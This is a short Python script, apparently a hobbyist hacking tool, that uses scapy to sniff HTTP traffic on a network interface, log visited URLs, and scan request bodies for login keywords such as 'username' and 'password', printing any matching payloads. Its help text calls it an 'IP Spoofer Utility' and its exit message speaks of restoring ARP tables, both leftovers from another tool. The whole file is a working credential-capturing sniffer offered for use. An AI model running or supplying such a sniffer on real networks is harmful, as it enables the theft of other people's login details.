import scapy.all as scapy
from scapy.layers import http
from rich.console import Console
from rich.text import Text
import argparse


console = Console()

def get_values():
   
    parser = argparse.ArgumentParser(
        description="IP Spoofer Utility ",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

 
    parser.add_argument(
        "-i", "--interface",
        dest="interface",
        required=True,
        help="Specify the network interface (e.g., eth0, wlan0) "
    )
   

    
    args = parser.parse_args()

 
    console.print("[bold cyan]Input Parameters:[/bold cyan]")
    console.print(f"[bold green]Interface:[/bold green] [yellow]{args.interface}[/yellow]")
   

    return args





def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)





def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url= packet[http.HTTPRequest].Host +packet[http.HTTPRequest].Path
        console.print(f"[bold green][+] HTTP Request >>[/bold green] [underline blue]{url}[/underline blue]")





        if packet.haslayer(scapy.Raw):
            load=packet[scapy.Raw].load
            keyword=["username","user","login","password","pass","email"]
            try:
            
                load_str = load.decode('utf-8')
                for keys in keyword:
                    if keys in load_str: 
                        highlighted_load = Text(load_str, style="bold red")
                        highlighted_load.highlight_words([keys], "bold yellow on black")
                        console.print(f"[bold magenta]Keyword '{keys}' found in load:[/bold magenta] {highlighted_load}")
                        break
            except UnicodeDecodeError:
                
                pass





values = get_values()



console.print(f"[bold cyan]Starting packet sniffer on interface:[/bold cyan] [yellow]{values.interface}[/yellow]")
try:
    sniff(values.interface)

except KeyboardInterrupt:
     print(f" [bold yellow][+] Detected CTRL+Z ........ Restoring ARP tables.......[/bold yellow]")